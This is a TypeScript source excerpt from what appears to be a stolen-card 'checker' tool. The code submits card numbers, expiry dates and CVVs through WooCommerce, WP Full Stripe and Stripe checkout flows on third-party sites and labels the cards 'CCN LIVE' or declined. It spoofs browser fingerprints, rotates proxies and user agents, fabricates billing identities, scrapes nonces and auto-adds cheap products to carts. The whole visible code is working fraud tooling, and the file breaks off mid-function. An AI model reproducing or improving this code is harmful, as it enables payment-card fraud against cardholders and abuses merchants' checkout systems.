    // turned a routing error into a fake "Card Declined" verdict.
    //
    // Detect from the request status (sessionFetch returns ok=false / 404),
    // OR from the body text (WP's 404 page has unmistakable shape: doctype +
    // <title>Page not found</title> + no JSON wrapper).
    if (looksLike404Response(rawText, ajaxResp.status)) {
      return {
        status: "error",
        response: `Gateway Error: admin-ajax returned 404 / Page Not Found (status=${ajaxResp.status}). The site routed our POST to its 404 handler, not the WP Full Stripe action. Likely causes: wrong action name for this site, admin-ajax blocked by security plugin, or REST/admin-ajax URL rewritten. Card was NOT submitted.`,
        code: "wpfs_admin_ajax_404",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
        rawSnippet: rawText.slice(0, 500),
      };
    }

    // -- Field-validation guard --------------------------------------------
    // WP Full Stripe returns { success:false, bindingResult:{ fieldErrors:{
    //   errors:[{ name:"wpfs-custom-input", message:"Please enter a value for
    //   'Donor Name(s)'" }, ...] }}} when a REQUIRED field is missing/invalid.
    // This is NOT a card decline � the card was never submitted to Stripe.
    // Surface it as a clear error naming the exact field(s) the site rejected,
    // so the operator (and we) know precisely what to add. Previously this
    // fell through to keyword classification and got mislabeled a decline,
    // polluting live/dead stats and hiding the real cause.
    try {
      const j = JSON.parse(rawText);
      const fe = j?.bindingResult?.fieldErrors?.errors || j?.fieldErrors?.errors || j?.errors;
      if (j?.success === false && Array.isArray(fe) && fe.length) {
        const fields = fe
          .map((e: any) => {
            const name = e?.name || e?.id || "field";
            // Pull the human label out of "Please enter a value for 'X'".
            const label = (e?.message || "").match(/['"]([^'"]+)['"]/)?.[1] || e?.message || "";
            return label ? `${name} (${label})` : name;
          })
          .filter(Boolean);
        const uniqueFields = [...new Set(fields)];
        return {
          status: "error",
          response: `Form Validation Error: site requires field(s) we didn't send ? ${uniqueFields.slice(0, 4).join(", ")}. Card was NOT submitted. The runtime scrape should reproduce these � if this persists, the field uses non-standard markup; paste the donate-page HTML so the value picker can be widened.`,
          code: "wpfs_field_validation",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
          rawSnippet: rawText.slice(0, 500),
        };
      }
    } catch { /* not JSON � fall through to normal classify */ }

    // -- Step 4: classify --
    // First try parsing as JSON (most WPFS responses are { success: bool, message: "..." })
    let messageText = rawText;
    try {
      const js = JSON.parse(rawText);
      messageText = String(js.message || js.error || js.data || rawText);
      // Direct success/failure shortcut
      if (js.success === true && !js.requires_action && !/requires_action|3d.secure/i.test(messageText)) {
        // Real charge cleared (or PI confirmed). Use the wrapper-normalizer path
        // so the formatter / address echo / flag emoji all apply.
        const normalizedShape = {
          status: "succeeded",
          id: js.payment_intent_id || js.intent_id || pmId,
          payment_method: { card: { checks: card.checks } },
        };
        const classified = classifyStripeResponse(normalizedShape, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        classified.discoveredSettings = {
          ...(detectedKey  && !publicKey                                            ? { publicKey: detectedKey } : {}),
          ...(foundPath    && foundPath !== "/donate/" && foundPath !== donatePath  ? { donatePath: foundPath } : {}),
          ...(wpfsFormName                                                          ? { wpFsFormName: wpfsFormName as any } : {}),
          ...(wpfsAjaxUrl  && wpfsAjaxUrl !== `${cleanSiteUrl}/wp-admin/admin-ajax.php` ? { ajaxUrl: wpfsAjaxUrl } : {}),
        };
        return classified;
      }
    } catch { /* keep raw text */ }

    // Keyword-based classification (same bucket the other admin-ajax checkers
    // use, so vocabulary stays consistent across plugins)
    const tag = classifyStripeResponseTag(messageText);
    if (tag) {
      if (tag.tag === "3DS") {
        return {
          status: "live",
          response: formatCardResult({
            tier: "CCN LIVE", mark: "?", detail: "3DS Required (wp_full_stripe)",
            brand, funding, country, threeDs: "3DS",
            billingUsed: billing,
          }),
          code: "requires_action",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
          rawSnippet: rawText.slice(0, 500),
        };
      }
      if (tag.tag === "HIT") {
        const normalizedShape = { status: "succeeded", id: pmId, payment_method: { card: { checks: card.checks } } };
        const classified = classifyStripeResponse(normalizedShape, gateName, cardMeta);
        classified.latency = Date.now() - start;
        classified.cardInfo = fullCardInfo;
        return classified;
      }
    }

    // Fall through: route the raw message through the decline classifier so
    // known Stripe codes (insufficient_funds / do_not_honor / etc.) land as
    // CCN LIVE rather than generic error.
    const errCode = messageText.match(/\b(insufficient_funds|do_not_honor|generic_decline|card_declined|expired_card|incorrect_cvc|invalid_cvc|stolen_card|fraudulent|authentication_required|payment_intent_authentication_failure)\b/i)?.[1] || "";
    return classifyDeclineCode(errCode || "card_declined", messageText.slice(0, 140), card.checks?.cvc_check, gateName, cardMeta);

  } catch (e: any) {
    return {
      status: "error",
      response: `WP Full Stripe Error: ${e?.message || e}`,
      code: "wpfs_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
}

export async function checkCardStripeAuth(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);

  try {
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };
    let clientSecret: string | null = null;
    let siId: string | null = null;
    // WHMCS/WC Stripe checkout pages expose wallet_config_id; reference bots inject it
    // into client_attribution_metadata to reduce integration-surface rejections.
    // Precedence: manual override ? page scrape (set below) ? fresh uuid4.
    let walletConfigId: string = extras?.walletConfigId || crypto.randomUUID();

    const setupPaths = [
      { url: `${cleanSiteUrl}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent`, body: "payment_method=stripe_cc" },
      { url: `${cleanSiteUrl}/?wc-ajax=wc_stripe_frontend_request&path=%2Fwc-stripe%2Fv1%2Fsetup-intent`, body: "payment_method=stripe_cc" },
      { url: `${cleanSiteUrl}/?wc-ajax=wc_stripe_create_setup_intent`, body: "payment_method=stripe&wc-stripe-payment-type=card" },
    ];

    for (const sp of setupPaths) {
      try {
        const setupResp = await sessionFetch(sp.url, state, {
          method: "POST",
          body: sp.body,
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}/checkout/`,
          origin: cleanSiteUrl,
        });
        state = setupResp.state;

        clientSecret = extractBetween(setupResp.text, '"client_secret":"', '"');
        if (clientSecret) {
          siId = clientSecret.split("_secret_")[0];
          break;
        }
      } catch {}
    }

    if (!clientSecret || !siId) {
      const pagePaths = ["/my-account/add-payment-method/", "/checkout/", "/account/add-payment-method/"];
      for (const pp of pagePaths) {
        try {
          const pageResp = await sessionFetch(`${cleanSiteUrl}${pp}`, state);
          state = pageResp.state;

          const nonce = extractBetween(pageResp.text, '"createAndConfirmSetupIntentNonce":"', '"')
            || extractBetween(pageResp.text, '"add_card_nonce":"', '"')
            || extractBetween(pageResp.text, '"setup_intent_nonce":"', '"')
            || extractBetween(pageResp.text, '"createSetupIntentNonce":"', '"');

          // Pick up wallet_config_id from the WHMCS/WC Stripe page if present.
          // Manual override (extras.walletConfigId) wins � don't clobber it from page scraping.
          if (!extras?.walletConfigId) {
            const wcid = pageResp.text.match(/wallet_config_id["'\s:=]+["']?([a-f0-9-]{8,})["']?/i)?.[1];
            if (wcid) walletConfigId = wcid;
          }

          if (nonce) {
            const stripeVer = pick(STRIPE_JS_VERSIONS);
            const pmBody = new URLSearchParams({
              type: "card",
              "card[number]": cardNumber.trim(),
              "card[cvc]": cvv.trim(),
              "card[exp_month]": month,
              "card[exp_year]": year,
              "billing_details[name]": rndName(),
              "billing_details[address][postal_code]": billing.zip,
              "billing_details[address][country]": billing.country,
              guid: crypto.randomUUID(),
              muid: crypto.randomUUID(),
              sid: crypto.randomUUID(),
              payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`,
              referrer: cleanSiteUrl,
              time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
              key: publicKey,
              "client_attribution_metadata[client_session_id]": crypto.randomUUID(),
              "client_attribution_metadata[merchant_integration_source]": "elements",
              "client_attribution_metadata[merchant_integration_subtype]": "card-element",
              "client_attribution_metadata[merchant_integration_version]": "2017",
              "client_attribution_metadata[wallet_config_id]": walletConfigId,
            });

            const pmResp = await fetch("https://api.stripe.com/v1/payment_methods", {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                Accept: "application/json",
                Origin: "https://js.stripe.com",
                Referer: "https://js.stripe.com/",
                "User-Agent": ua,
                "sec-ch-ua": secChUa,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
              },
              body: pmBody.toString(),
            });
            const pmResult = await pmResp.json();

            if (pmResult.error) {
              const errCode = pmResult.error.decline_code || pmResult.error.code || "unknown";
              const errMsg = pmResult.error.message || "Stripe error";
              const cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };
              const result = classifyStripeResponse(pmResult, gateName, cardMeta);
              result.latency = Date.now() - start;
              result.cardInfo = fullCardInfo;
              return result;
            }

            const pmId = pmResult.id;
            if (!pmId) {
              return { status: "error", response: "No payment method ID", code: "no_pm_id", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
            }

            const card = pmResult.card || {};
            const cardMeta = {
              brand: (card.brand || "unknown").toUpperCase(),
              funding: card.funding || "unknown",
              country: card.country || "??",
              threeDs: card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS",
              billing,
            };

            const confirmBody = new URLSearchParams({
              action: "create_and_confirm_setup_intent",
              "wc-stripe-payment-method": pmId,
              "wc-stripe-payment-type": "card",
              _ajax_nonce: nonce,
            });

            const confirmResp = await sessionFetch(
              `${cleanSiteUrl}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent`,
              state,
              {
                method: "POST",
                body: confirmBody.toString(),
                contentType: "application/x-www-form-urlencoded",
                referer: `${cleanSiteUrl}${pp}`,
                origin: cleanSiteUrl,
                xRequestedWith: true,
              }
            );

            const wcText = confirmResp.text.trim();

            if (wcText.length > 5) {
              const wcCs = extractBetween(wcText, '"client_secret":"', '"');
              if (wcCs) {
                const wcSiId = wcCs.split("_secret_")[0];
                const siConfirmBody = new URLSearchParams({
                  payment_method: pmId,
                  use_stripe_sdk: "true",
                  key: publicKey,
                  client_secret: wcCs,
                  "expand[0]": "payment_method",
                  "client_attribution_metadata[client_session_id]": crypto.randomUUID(),
                  "client_attribution_metadata[merchant_integration_source]": "elements",
                  "client_attribution_metadata[merchant_integration_subtype]": "card-element",
                  "client_attribution_metadata[merchant_integration_version]": "2017",
                  "client_attribution_metadata[wallet_config_id]": walletConfigId,
                });
                try {
                  const siConfirmResp = await fetch(`https://api.stripe.com/v1/setup_intents/${wcSiId}/confirm`, {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/x-www-form-urlencoded",
                      "User-Agent": ua,
                      Origin: "https://js.stripe.com",
                      Referer: "https://js.stripe.com/",
                    },
                    body: siConfirmBody.toString(),
                  });
                  const siResult = await siConfirmResp.json();
                  const siClassified = await classifyAndUpgrade3DS(siResult, gateName, cardMeta, ua, secChUa, publicKey);
                  siClassified.latency = Date.now() - start;
                  siClassified.cardInfo = fullCardInfo;
                  return siClassified;
                } catch {}
              }

              const bankResult = classifyBankText(wcText, gateName, cardMeta);
              bankResult.latency = Date.now() - start;
              bankResult.cardInfo = fullCardInfo;
              return bankResult;
            }

            const tokenResult = await stripeTokenize(
              cardNumber.trim(), month, year, cvv.trim(), publicKey, gateName, cleanSiteUrl, start
            );
            tokenResult.latency = Date.now() - start;
            tokenResult.cardInfo = fullCardInfo;
            // Site was available but checkout couldn't be confirmed � not live
            if (tokenResult.code === "tokenized" || tokenResult.code === "pm_created") {
              return {
                ...tokenResult,
                status: "error" as const,
                response: tokenResult.response
                  .replace("CCN LIVE ? Tokenized", "CCN ? Tokenized")
                  .replace("No Bank Confirm", "Auth Checkout Unreachable"),
                code: "tokenized_no_checkout",
              };
            }
            return tokenResult;
          }
        } catch {}
      }
    }

    if (clientSecret && siId) {
      const confirmBody = new URLSearchParams({
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cardNumber.trim(),
        "payment_method_data[card][cvc]": cvv.trim(),
        "payment_method_data[card][exp_month]": month,
        "payment_method_data[card][exp_year]": year,
        "payment_method_data[billing_details][address][postal_code]": billing.zip,
        "payment_method_data[billing_details][address][country]": billing.country,
        "payment_method_data[client_attribution_metadata][client_session_id]": crypto.randomUUID(),
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "card-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2017",
        "payment_method_data[client_attribution_metadata][wallet_config_id]": walletConfigId,
        "client_attribution_metadata[wallet_config_id]": walletConfigId,
        use_stripe_sdk: "true",
        key: publicKey,
        client_secret: clientSecret,
        "expand[0]": "payment_method",
      });

      const confirmResp = await fetch(`https://api.stripe.com/v1/setup_intents/${siId}/confirm`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": ua,
          "sec-ch-ua": secChUa,
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          Origin: "https://js.stripe.com",
          Referer: "https://js.stripe.com/",
        },
        body: confirmBody.toString(),
      });

      const confirmResult = await confirmResp.json();
      dbg(`[auth] ${gateName}: SI confirm status=${confirmResult.status}, error=${confirmResult.error?.code || "none"}`);
      const siCvcCheck = confirmResult.payment_method?.card?.checks?.cvc_check
        || confirmResult.last_setup_error?.payment_method?.card?.checks?.cvc_check;
      dbg(`[auth] ${gateName}: SI cvc_check=${siCvcCheck || "null"}, pm type=${typeof confirmResult.payment_method}`);
      const pm = confirmResult.payment_method;
      let cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };

      if (typeof pm === "object" && pm?.card) {
        const c = pm.card;
        cardMeta = {
          brand: (c.brand || "unknown").toUpperCase(),
          funding: c.funding || "unknown",
          country: c.country || "??",
          threeDs: c.three_d_secure_usage?.supported ? "3DS" : "NO-3DS",
          billing,
        };
      }

      const result = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, publicKey);
      result.latency = Date.now() - start;
      result.cardInfo = fullCardInfo;
      return result;
    }

    return { status: "error", response: "Could not get setup_intent from site - check siteUrl", code: "no_setup_intent", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  } catch (e: any) {
    return { status: "error", response: `Auth Error: ${e.message}`, code: "network_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

async function extractPaymentIntentFromSite(
  cleanSiteUrl: string,
  state: SessionState,
  billing: typeof BILLING_DATA[0],
  name: string,
  email: string,
  extras?: GateExtras,
): Promise<{ clientSecret: string; piId: string; state: SessionState; wcDeclined?: { message: string; orderId: number; declineCode?: string }; detectedAmount?: string; detectedProductId?: string; detectedProductName?: string } | null> {

  // Tracks the price we'll actually charge (cents minor units, lowest-priced
  // viable product from Store API) so the caller can surface "this gate
  // charged $X.XX" in the response string. Surfaced via the returned object.
  // Both lives at OUTER scope so the post-race wrapper at the bottom can read
  // them � the cart-flow IIFE mutates them via closure capture.
  let detectedAmount: string | null = null;
  let lastAddedProductId: string | null = null;
  let detectedProductName: string | null = null;

  const directSetupPromise = (async (): Promise<{ clientSecret: string; piId: string; state: SessionState } | null> => {
    const paths = [
      `${cleanSiteUrl}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent`,
      `${cleanSiteUrl}/?wc-ajax=wc_stripe_frontend_request&path=%2Fwc-stripe%2Fv1%2Fsetup-intent`,
    ];
    for (const url of paths) {
      try {
        const setupResp = await sessionFetch(url, { ...state }, {
          method: "POST",
          body: "payment_method=stripe_cc",
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}/checkout/`,
          origin: cleanSiteUrl,
          xRequestedWith: true,
        });
        const cs = extractBetween(setupResp.text, '"client_secret":"', '"');
        if (cs) {
          dbg(`[PI-extract] Direct setup-intent: ${cs.substring(0, 30)}...`);
          return { clientSecret: cs, piId: cs.split("_secret_")[0], state: setupResp.state };
        }
      } catch {}
    }
    return null;
  })();

  const cartFlowPromise = (async (): Promise<{ clientSecret: string; piId: string; state: SessionState; wcDeclined?: { message: string; orderId: number; declineCode?: string } } | null> => {
  let cState = { ...state };
  // lastAddedProductId lives at the outer scope so the post-race wrapper can
  // surface it as detectedProductId in the return shape (see top of fn).

  const findAndAddProduct = async (): Promise<boolean> => {
    // If a specific product ID was configured, use it directly
    if (extras?.productId) {
      const pid = String(extras.productId);
      const addResp = await sessionFetch(`${cleanSiteUrl}/?add-to-cart=${pid}`, cState, {
        method: "POST",
        referer: `${cleanSiteUrl}/shop/`,
        origin: cleanSiteUrl,
      });
      cState = addResp.state;
      lastAddedProductId = pid;
      dbg(`[PI-extract] Added configured product ${pid} to cart`);
      return true;
    }

    // -- PREFERRED: WC Store API product discovery (runs FIRST) --------------
    // Structured product data (id, type, price, stock, name) ? we can pick a
    // REAL purchasable simple in-stock product. The HTML-regex fallback below
    // only grabs the first add-to-cart id it sees with no validation, which
    // routinely picked variable/grouped/out-of-stock products that fail to add.
    try {
      const apiResp = await sessionFetch(`${cleanSiteUrl}/wp-json/wc/store/v1/products?per_page=20&orderby=price&order=asc`, cState, {
        accept: "application/json",
        timeout: 6000,
      });
      cState = apiResp.state;
      if (apiResp.ok) {
        const products = JSON.parse(apiResp.text);
        const isAddable = (p: any) => {
          const price = parseInt(p?.prices?.price || "0", 10);
          const inStock = p?.is_in_stock !== false;
          const purchasable = p?.is_purchasable !== false;
          const simple = !p?.type || p.type === "simple";
          return price >= 50 && inStock && purchasable && simple;
        };
        const list = Array.isArray(products) ? products : [];
        const target =
          list.find(isAddable) ||
          list.find((p: any) => (!p?.type || p.type === "simple") && p?.is_in_stock !== false && p?.is_purchasable !== false);
        if (target?.id) {
          const addResp = await sessionFetch(`${cleanSiteUrl}/?add-to-cart=${target.id}`, cState, {
            method: "POST", referer: cleanSiteUrl, origin: cleanSiteUrl,
          });
          cState = addResp.state;
          lastAddedProductId = String(target.id);
          const cents = parseInt(target.prices?.price || "0", 10);
          if (cents > 0) detectedAmount = (cents / 100).toFixed(2);
          const pname = (target?.name || "").toString().replace(/\s+/g, " ").trim().slice(0, 40);
          if (pname) detectedProductName = pname;
          dbg(`[PI-extract] Added product ${target.id} "${pname || "?"}" (type=${target.type ?? "simple"}, $${detectedAmount || "?"}, stock=${target.is_in_stock !== false}) from Store API`);
          return true;
        }
        dbg(`[PI-extract] Store API returned ${list.length} products but none addable (simple+instock+purchasable) � falling to HTML scrape`);
      }
    } catch { /* Store API unavailable (old WC / REST disabled) � fall through */ }

    const shopPaths = extras?.shopPath
      ? [extras.shopPath, "/shop/", "/store/", "/products/", "/"].filter((v, i, a) => a.indexOf(v) === i)
      : ["/shop/", "/store/", "/products/", "/"];
    for (const sp of shopPaths) {
      try {
        const shopResp = await sessionFetch(`${cleanSiteUrl}${sp}`, cState, { timeout: 10000 });
        cState = shopResp.state;
        if (!shopResp.ok) continue;

        const productPatterns = [
          /\?add-to-cart=(\d+)/,
          /data-product_id="(\d+)"/,
          /data-product-id="(\d+)"/,
          /post-(\d+).*?type-product/,
          /product_id['":\s]+['"]?(\d+)/,
          /wc-product-(\d+)/,
        ];

        let productId: string | null = null;
        for (const pat of productPatterns) {
          const m = shopResp.text.match(pat);
          if (m) { productId = m[1]; break; }
        }

        if (!productId) {
          const productLinks = shopResp.text.match(/href=["']([^"']*\/product\/[^"']+)/gi);
          if (productLinks?.[0]) {
            const productUrl = new URL(productLinks[0].replace(/href=["']/i, ""), cleanSiteUrl).href;
            const prodResp = await sessionFetch(productUrl, cState, { timeout: 8000 });
            cState = prodResp.state;
            for (const pat of productPatterns) {
              const m = prodResp.text.match(pat);
              if (m) { productId = m[1]; break; }
            }
          }
        }

        if (productId) {
          const addResp = await sessionFetch(`${cleanSiteUrl}/?add-to-cart=${productId}`, cState, {
            method: "POST",
            referer: `${cleanSiteUrl}${sp}`,
            origin: cleanSiteUrl,
          });
          cState = addResp.state;
          lastAddedProductId = productId;
          dbg(`[PI-extract] Added product ${productId} to cart from ${sp}`);
          return true;
        }
      } catch {}
    }

    return false;
  };

  try {
    await findAndAddProduct();
  } catch (e: any) {
    dbg(`[PI-extract] Product add failed: ${e.message}`);
  }

  const checkoutPaths = extras?.checkoutPath
    ? [extras.checkoutPath, "/checkout/", "/secure-checkout/", "/order/"].filter((v, i, a) => a.indexOf(v) === i)
    : ["/checkout/", "/secure-checkout/", "/order/"];
  for (const cp of checkoutPaths) {
    try {
      const pageResp = await sessionFetch(`${cleanSiteUrl}${cp}`, cState);
      cState = pageResp.state;
      const html = pageResp.text;

      const hasStripe = html.includes("stripe") || html.includes("Stripe");
      const hasCheckoutForm = html.includes("woocommerce-checkout") || html.includes("checkout-form");
      const isBlockCheckout = html.includes("wc-block-checkout") || html.includes("wp-block-woocommerce") || (hasStripe && !hasCheckoutForm && html.length > 50000);
      dbg(`[PI-extract] Checkout page: stripe=${hasStripe}, form=${hasCheckoutForm}, block=${isBlockCheckout}, len=${html.length}`);

      if (isBlockCheckout) {
        dbg(`[PI-extract] Block checkout detected, skipping classic flow to Store API`);
        break;
      }

      const nonce = extractBetween(html, '"createPaymentIntentNonce":"', '"')
        || extractBetween(html, '"stripe_payment_intent_nonce":"', '"')
        || extractBetween(html, '"paymentIntentNonce":"', '"')
        || extractBetween(html, 'name="wc-stripe-payment-intent-nonce" value="', '"');

      const wcNonce = extractBetween(html, 'name="woocommerce-process-checkout-nonce" value="', '"')
        || extractBetween(html, "name='woocommerce-process-checkout-nonce' value='", "'")
        || html.match(/name="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"/)?.[1]
        || html.match(/value="([^"]+)"[^>]*name="woocommerce-process-checkout-nonce"/)?.[1]
        || extractBetween(html, '"checkout_nonce":"', '"')
        || extractBetween(html, '"woocommerce-process-checkout-nonce":"', '"')
        || extractBetween(html, '"woocommerce_process_checkout_nonce":"', '"')
        || extractBetween(html, '"process_checkout":"', '"');
      const setupNonce = extractBetween(html, '"createAndConfirmSetupIntentNonce":"', '"');
      dbg(`[PI-extract] Nonces: piNonce=${!!nonce}, wcNonce=${!!wcNonce}, setupNonce=${!!setupNonce}`);

      if (nonce) {
        const piResp = await sessionFetch(`${cleanSiteUrl}/?wc-ajax=wc_stripe_create_payment_intent`, cState, {
          method: "POST",
          body: new URLSearchParams({
            "wc-stripe-payment-type": "card",
            _ajax_nonce: nonce,
          }).toString(),
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}${cp}`,
          origin: cleanSiteUrl,
          xRequestedWith: true,
        });
        cState = piResp.state;
        dbg(`[PI-extract] PI AJAX response (${piResp.text.length} chars): ${piResp.text.substring(0, 200)}`);

        const cs = extractBetween(piResp.text, '"clientSecret":"', '"')
          || extractBetween(piResp.text, '"client_secret":"', '"');
        if (cs) {
          dbg(`[PI-extract] Got PI client_secret: ${cs.substring(0, 30)}...`);
          return { clientSecret: cs, piId: cs.split("_secret_")[0], state: cState };
        }
      }

      const embeddedPiCs = extractBetween(html, '"clientSecret":"pi_', '"');
      if (embeddedPiCs) {
        const cs = `pi_${embeddedPiCs}`;
        return { clientSecret: cs, piId: cs.split("_secret_")[0], state: cState };
      }

      const embeddedSetiCs = extractBetween(html, '"clientSecret":"seti_', '"');
      if (embeddedSetiCs) {
        const cs = `seti_${embeddedSetiCs}`;
        return { clientSecret: cs, piId: cs.split("_secret_")[0], state: cState };
      }

      const setupIntentNonce = extractBetween(html, '"createAndConfirmSetupIntentNonce":"', '"')
        || extractBetween(html, '"setup_intent_nonce":"', '"');
      const wcStripeNonce = extractBetween(html, '"nonce":{"checkout":"', '"')
        || extractBetween(html, '"wc_stripe_nonce":"', '"');

      if (setupIntentNonce) {
        try {
          const siBody = new URLSearchParams({
            payment_method: "stripe_cc",
            "wc-stripe-payment-type": "card",
          });
          if (setupIntentNonce) siBody.set("_ajax_nonce", setupIntentNonce);

          const siResp = await sessionFetch(`${cleanSiteUrl}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent`, cState, {
            method: "POST",
            body: siBody.toString(),
            contentType: "application/x-www-form-urlencoded",
            referer: `${cleanSiteUrl}${cp}`,
            origin: cleanSiteUrl,
            xRequestedWith: true,
          });
          cState = siResp.state;
          dbg(`[PI-extract] Setup intent response (${siResp.text.length} chars): ${siResp.text.substring(0, 200)}`);
          const siCs = extractBetween(siResp.text, '"client_secret":"', '"');
          if (siCs) {
            return { clientSecret: siCs, piId: siCs.split("_secret_")[0], state: cState };
          }
        } catch (siErr: any) {
          dbg(`[PI-extract] Setup intent failed: ${siErr.message}`);
        }
      }

      dbg(`[PI-extract] wcNonce for checkout: ${!!wcNonce}`);

      if (wcNonce) {
        const checkoutBody = new URLSearchParams({
          billing_first_name: name.split(" ")[0],
          billing_last_name: name.split(" ")[1] || "Smith",
          billing_email: email,
          billing_phone: `+1${Math.floor(Math.random() * 9000000000) + 1000000000}`,
          billing_address_1: (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
          billing_city: billing.city,
          billing_state: billing.stateCode,
          billing_postcode: billing.zip,
          billing_country: billing.country,
          payment_method: "stripe",
          "wc-stripe-payment-method": "",
          "wc-stripe-payment-type": "card",
          "woocommerce-process-checkout-nonce": wcNonce,
          _wp_http_referer: cp,
          terms: "on",
          terms_field: "1",
        });

        const coResp = await sessionFetch(`${cleanSiteUrl}/?wc-ajax=checkout`, cState, {
          method: "POST",
          body: checkoutBody.toString(),
          contentType: "application/x-www-form-urlencoded",
          referer: `${cleanSiteUrl}${cp}`,
          origin: cleanSiteUrl,
          xRequestedWith: true,
        });
        cState = coResp.state;
        dbg(`[PI-extract] Checkout submit response (${coResp.text.length} chars): ${coResp.text.substring(0, 300)}`);

        const cs2 = extractBetween(coResp.text, '"clientSecret":"', '"')
          || extractBetween(coResp.text, '"client_secret":"', '"')
          || extractBetween(coResp.text, 'client_secret=', '&')
          || extractBetween(coResp.text, 'client_secret=', '"');
        if (cs2) {
          return { clientSecret: cs2, piId: cs2.split("_secret_")[0], state: cState };
        }
      }
    } catch (e: any) {
      dbg(`[checker] Checkout path ${cp} failed: ${e.message}`);
    }
  }

  try {
    // -- WC Store API checkout (block-checkout sites) -----------------------
    //
    // Key insight: WooCommerce has TWO separate cart session systems:
    //   Classic: /?add-to-cart=X  ?  woocommerce_session_* cookie
    //   Store API: POST /wc/store/v1/cart/add-item  ?  woocommerce-store-api-cart-token cookie
    //
    // /?add-to-cart adds to the CLASSIC cart. /wc/store/v1/checkout reads the
    // STORE API cart. They never see each other's items.
    //
    // The Store API add-item endpoint requires a "Nonce" header (returned by
    // GET /wc/store/v1/cart). Without it WC returns 401 "Missing the Nonce header".
    //
    // Three-step flow:
    //   Step 1 � GET /wc/store/v1/cart  ?  obtain initial nonce + cart-token
    //   Step 2 � POST add-item with Nonce header  ?  confirm items > 0
    //   Step 3 � POST checkout ONLY when storeCartHasItems === true

    let wcStoreNonce: string | null = extras?.wcStoreNonce || null;
    let wcCartToken: string | null = null;
    let storeCartHasItems = false;

    // Step 1: GET /wc/store/v1/cart � acquires the nonce required by add-item
    try {
      const initCartHeaders: Record<string, string> = {
        "User-Agent": cState.ua,
        "Accept": "application/json",
        "sec-ch-ua": cState.secChUa,
        "sec-ch-ua-mobile": "?0",
        ...(cState.cookies ? { Cookie: cState.cookies } : {}),
      };
      const initCartResp = await fetch(`${cleanSiteUrl}/wp-json/wc/store/v1/cart`, {
        headers: initCartHeaders,
        signal: AbortSignal.timeout(8000),
        redirect: "follow",
      });
      const initCartCookies = parseCookies(initCartResp.headers);
      cState = { ...cState, cookies: mergeCookies(cState.cookies, initCartCookies) };
      const initCartBody = await initCartResp.text();
      wcStoreNonce = initCartResp.headers.get("Nonce")
        || initCartResp.headers.get("nonce")
        || initCartResp.headers.get("X-WC-Store-API-Nonce")
        || initCartBody.match(/"nonce"\s*:\s*"([^"]+)"/)?.[1]
        || extractBetween(initCartBody, '"nonce":"', '"')
        || null;
      wcCartToken = initCartResp.headers.get("Cart-Token") || null;
      dbg(`[PI-extract] Store API cart GET: nonce=${!!wcStoreNonce}, cart-token=${!!wcCartToken}`);
    } catch (cartGetErr: any) {
      dbg(`[PI-extract] Store API cart GET failed: ${cartGetErr.message}`);
    }

    // Step 2: Add item to Store API cart (requires Nonce from step 1).
    // IMPORTANT: WC returns Nonce + Cart-Token headers on EVERY Store API
    // response, including 4xx errors.  We must read the body and verify
    // items_count > 0 before trusting those headers for checkout.
    if (lastAddedProductId && wcStoreNonce) {
      // Build headers with Nonce from step 1 � required to avoid 401
      const storeApiHeaders: Record<string, string> = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": cState.ua,
        "Nonce": wcStoreNonce,
        "sec-ch-ua": cState.secChUa,
        "sec-ch-ua-mobile": "?0",
        ...(cState.cookies ? { Cookie: cState.cookies } : {}),
        ...(wcCartToken ? { "Cart-Token": wcCartToken } : {}),
      };

